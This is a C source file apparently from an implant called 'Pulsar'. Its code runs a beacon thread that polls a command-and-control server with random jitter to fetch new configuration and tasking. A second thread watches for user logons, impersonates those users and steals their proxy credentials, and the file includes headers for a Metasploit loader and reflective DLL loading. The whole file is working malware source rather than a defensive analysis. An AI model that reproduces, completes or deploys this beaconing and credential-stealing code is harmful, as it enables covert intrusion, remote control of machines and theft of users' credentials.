#include "PulsarInternal.h"
#include "PulsarLog.h"
#include "PulsarProxyLib.h"
#include "MetasploitLoader.h"
#include "LoadLibraryR.h"
#include "vars.h"
#include "Watcher.h"
#include "creds.h"
#include "beacon.h"
#include "ProxyCreds.h"

#include <stdlib.h>
#include <time.h>
#include <EventSys.h>
#include <winhttp.h>


PPULSAR_CONTEXT pulsar_context;
HANDLE g_hStopPulsarEvent;




//
//This thread checks our C2 server, looks for new configuration and 
//tasking. On quitting it shuts down the ProxyInstaller thread, the 
// user watcher thread, and then exits itself
//
VOID BeaconThread(VOID) {
	DWORD dwWaitVal = 0;
	DWORD dwWaitTime = 0;

	DBGPrint("Called\n");


	//seet our random number generator
	srand(time(NULL));

	while (1){

		//Calculate wait time + jitter
		dwWaitTime = rand() % pulsar_context->dwBeaconJitter + pulsar_context->dwBeaconTime;
		DBGPrint("dwWaitTime is: %ld minutes\n",dwWaitTime);

		//Convert to millisecods
		dwWaitTime*=60000;
		DBGPrint("dwWaitTime is: %ld ms\n",dwWaitTime);

		//Wait for the shutdown signal, wherever it comes from, or
		//our, beacon whichever comes first
		dwWaitVal = WaitForSingleObject(g_hStopPulsarEvent,dwWaitTime);

		if(dwWaitVal == WAIT_OBJECT_0){
			DBGPrint("Object 0 signaled\n");
			break;
		}else{
			DBGPrint("Wait timeout\n");
			BeaconAndProcess();
		}

	}


	//Now send a quit signal to the proxy install thread
	DWORD dwThreadID = GetThreadId(pulsar_context->handles[0]);
	PostThreadMessage(dwThreadID,WM_QUIT,0,0);

	DBGPrint("Returning\n"); 
}


//
//This thread watches as user's log on, impersates them
//and collects all proxy credentails
//
VOID UserWatcher(VOID){
  DBGPrint("Called\n");
	DWORD dwWaitVal = 0;
	DWORD dwWaitTime = USER_CHECK_TIME;

	while (1){
		DBGPrint("dwWaitTime: %ld\n",dwWaitTime);
		DBGPrint("dwWaitTime in seconds: %d\n",dwWaitTime / 60000);
		//Wait for the shutdown signal, wherever it comes from, or
		//USER_CHECK_TIME, whichever comes first
		dwWaitVal = WaitForSingleObject(g_hStopPulsarEvent,dwWaitTime);

		if(dwWaitVal == WAIT_OBJECT_0){
			DBGPrint("Object 0 signaled\n");
			break;
		}else if(dwWaitVal == WAIT_TIMEOUT){
			DBGPrint("Wait timeout\n");
			GetUserCreds();
		}

	}


  DBGPrint("Returning\n");
}


//Close the log and flush everything
DWORD PulsarExit(VOID){

  DBGPrint("Called\n");

  SetEvent(g_hStopPulsarEvent);

  DBGPrint("Returning\n");

  return 0;
}



//
// Initialize the tool, return a pointer the Pulsar context 
//
//
PPULSAR_CONTEXT PulsarInit(VOID) {
	PPULSAR_CONTEXT ctx = NULL;
	HANDLE tmpHandle = NULL;
	
	DBGPrint("Called\n");

	//Allocate and initialze the context
	ctx = (PPULSAR_CONTEXT) HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PULSAR_CONTEXT) );
	if (!ctx) {
		DBGPrint("Failed to allocate Context\n");
		return NULL;
	} else {
		pulsar_context = ctx;
		for(int i = 0; i < MAX_HANDLES; i++){
			ctx->handles[i] = NULL;
		}
		ctx->handleCount = 0;
		ctx->firstBeacon = FALSE;
	}


	//Load our variables, fail if we can't load them,
	//as then we have no reason to exist
	if( LoadVars() == FALSE){
		DBGPrint("Failed to load variables\n");
		return NULL;
	}

	//Initialize the Credential store, create it if it isn't there
	InitCredStore();

	//Initialize the event for shutting us down
	g_hStopPulsarEvent = CreateEvent(NULL, FALSE, FALSE, NULL);


	//Break out the URL into components
	InitialzeBeaconResources();

	//Figure out the proxy scenario
	InitializeHttpSession(pulsar_context->BeaconHost,pulsar_context->BeaconPort,pulsar_context->BeaconResource,pulsar_context->BeaconFlags);


	//Create the User detector/cred stealer Thread
	tmpHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UserWatcher, NULL, 0, NULL);
	if (tmpHandle) {
		ctx->handles[ctx->handleCount++] = tmpHandle;
	} else {
		DBGPrint("Failed to start user watcher thread\n");
	}

	//Create the Beacon Thread
	tmpHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BeaconThread, NULL, 0, NULL);
	if (tmpHandle) {
		ctx->handles[ctx->handleCount++] = tmpHandle;
	} else {
		DBGPrint("Failed to start Beacon thread\n");
	}

	return ctx;
}
